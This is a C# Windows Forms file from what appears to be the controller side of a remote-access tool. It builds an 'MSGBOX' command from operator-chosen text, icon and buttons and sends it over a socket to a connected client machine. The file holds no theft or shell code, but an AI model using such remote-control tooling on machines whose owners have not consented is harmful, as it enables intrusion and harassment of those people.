using Server.Connection;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace Server.Forms
{
    public partial class FormMessageBox : MetroFramework.Forms.MetroForm
    {
        MessageBoxIcon icon;
        MessageBoxButtons buttons;

        Client client;
        public FormMessageBox(int id)
        {
            InitializeComponent();
            client = Listener.clients[id-1];
        }

        private void label5_Click(object sender, EventArgs e)
        {
            switch (korgiComboBox1.SelectedIndex)
            {
                case 0:
                    //Error
                    icon = MessageBoxIcon.Error;
                    break;
                case 1:
                    //None
                    icon = MessageBoxIcon.None;
                    break;
                case 2:
                    //Warning
                    icon = MessageBoxIcon.Warning;
                    break;
                case 3:
                    //Information
                    icon = MessageBoxIcon.Information;
                    break;
                case 4:
                    //Question
                    icon = MessageBoxIcon.Question;
                    break;
                case 5:
                    //Hand
                    icon = MessageBoxIcon.Hand;
                    break;
                case 6:
                    //Stop
                    icon = MessageBoxIcon.Stop;
                    break;
            }
            switch (korgiComboBox2.SelectedIndex)
            {
                case 0:
                    //OK
                    buttons = MessageBoxButtons.OK;
                    break;
                case 1:
                    //YesNo
                    buttons = MessageBoxButtons.YesNo;
                    break;
                case 2:
                    //YesNoCancel
                    buttons = MessageBoxButtons.YesNoCancel;
                    break;
                case 3:
                    //AbortRetryIgnore
                    buttons = MessageBoxButtons.AbortRetryIgnore;
                    break;
                case 4:
                    //OKCancel
                    buttons = MessageBoxButtons.OKCancel;
                    break;
            }
            MessageBox.Show(textBox1.Text, textBox2.Text, buttons, icon);
        }

        private void FormMessageBox_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            string sep = "[KORGI]";
            string icon = "NULL";
            string button = "NULL";

            switch (korgiComboBox1.SelectedIndex)
            {
                case 0:
                    //Error
                    icon = "Error";
                    break;
                case 1:
                    //None
                    icon = "None";
                    break;
                case 2:
                    //Warning
                    icon = "Warning";
                    break;
                case 3:
                    //Information
                    icon = "Information";
                    break;
                case 4:
                    //Question
                    icon = "Question";
                    break;
                case 5:
                    //Hand
                    icon = "Hand";
                    break;
                case 6:
                    //Stop
                    icon = "Stop";
                    break;
            }
            switch (korgiComboBox2.SelectedIndex)
            {
                case 0:
                    //OK
                    button = "OK";
                    break;
                case 1:
                    //YesNo
                    button = "YesNo";
                    break;
                case 2:
                    //YesNoCancel
                    button = "YesNoCancel";
                    break;
                case 3:
                    //AbortRetryIgnore
                    button = "AbortRetryIgnore";
                    break;
                case 4:
                    //OKCancel
                    button = "OKCancel";
                    break;
            }

            string d = textBox1.Text + sep + textBox2.Text + sep + button + sep + icon;
            byte[] data = Listener.MyDataPacker("MSGBOX", System.Text.Encoding.UTF8.GetBytes(d));
            client.sck.Send(data, 0, data.Length, System.Net.Sockets.SocketFlags.None);
        }
    }
}
